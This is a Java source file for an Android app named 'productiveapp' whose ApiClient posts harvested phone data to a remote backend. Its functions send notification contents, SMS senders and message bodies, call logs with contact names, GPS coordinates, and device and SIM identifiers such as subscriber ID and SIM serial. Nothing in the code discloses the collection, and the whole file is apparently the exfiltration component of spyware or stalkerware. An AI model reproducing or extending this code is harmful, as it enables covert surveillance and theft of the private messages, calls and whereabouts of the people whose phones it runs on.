package com.example.productiveapp;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ApiClient {

    private static final String TAG = "ApiClient";
    // TODO: Replace with your actual backend API endpoint
    private static final String BASE_URL = "https://your-backend.com/api/";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    private static void sendData(Context context, String endpoint, JSONObject data) {
        executor.execute(() -> {
            try {
                URL url = new URL(BASE_URL + endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);

                String jsonInputString = data.toString();
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Response Code for " + endpoint + ": " + responseCode);

                // Optionally read response if needed
                /*
                try (BufferedReader br = new BufferedReader(
                     new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder response = new StringBuilder();
                    String responseLine = null;
                    while ((responseLine = br.readLine()) != null) {
                        response.append(responseLine.trim());
                    }
                    Log.d(TAG, "Response: " + response.toString());
                }
                */

                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, endpoint + " data sent successfully.");
                    // Toast.makeText(context, endpoint + " data sent!", Toast.LENGTH_SHORT).show(); // Use judiciously, can be annoying
                } else {
                    Log.e(TAG, "Failed to send " + endpoint + " data. Response Code: " + responseCode);
                    // Toast.makeText(context, "Failed to send " + endpoint + " data", Toast.LENGTH_SHORT).show();
                }

            } catch (Exception e) {
                Log.e(TAG, "Error sending " + endpoint + " data: " + e.getMessage());
                // Toast.makeText(context, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    public static void sendNotificationData(Context context, String packageName, String title, String text) {
        JSONObject data = new JSONObject();
        try {
            data.put("type", "notification");
            data.put("timestamp", System.currentTimeMillis());
            data.put("packageName", packageName);
            data.put("title", title);
            data.put("text", text);
            sendData(context, "notifications", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for notification data: " + e.getMessage());
        }
    }

    public static void sendSmsData(Context context, String sender, String messageBody) {
        JSONObject data = new JSONObject();
        try {
            data.put("type", "sms");
            data.put("timestamp", System.currentTimeMillis());
            data.put("sender", sender);
            data.put("messageBody", messageBody);
            sendData(context, "sms", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for SMS data: " + e.getMessage());
        }
    }

    public static void sendCallLogData(Context context, String number, String name, String type, long date, int duration) {
        JSONObject data = new JSONObject();
        try {
            data.put("type", "calllog");
            data.put("timestamp", System.currentTimeMillis());
            data.put("number", number);
            data.put("contactName", name);
            data.put("callType", type);
            data.put("callDate", date);
            data.put("duration", duration);
            sendData(context, "calllogs", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for call log data: " + e.getMessage());
        }
    }

    public static void sendLocationData(Context context, double latitude, double longitude, double altitude, float accuracy) {
        JSONObject data = new JSONObject();
        try {
            data.put("type", "location");
            data.put("timestamp", System.currentTimeMillis());
            data.put("latitude", latitude);
            data.put("longitude", longitude);
            data.put("altitude", altitude);
            data.put("accuracy", accuracy);
            sendData(context, "locations", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for location data: " + e.getMessage());
        }
    }

    public static void sendDeviceState(Context context, String deviceId, String subscriberId,
                                       String simSerialNumber, String networkOperatorName,
                                       String networkCountryIso, String simOperatorName,
                                       String phoneType, String dataState, String callState) {
        JSONObject data = new JSONObject();
        try {
            data.put("type", "device_state");
            data.put("timestamp", System.currentTimeMillis());
            data.put("deviceId", deviceId);
            data.put("subscriberId", subscriberId);
            data.put("simSerialNumber", simSerialNumber);
            data.put("networkOperatorName", networkOperatorName);
            data.put("networkCountryIso", networkCountryIso);
            data.put("simOperatorName", simOperatorName);
            data.put("phoneType", phoneType);
            data.put("dataState", dataState);
            data.put("callState", callState);
            sendData(context, "device_state", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for device state data: " + e.getMessage());
        }
    }
}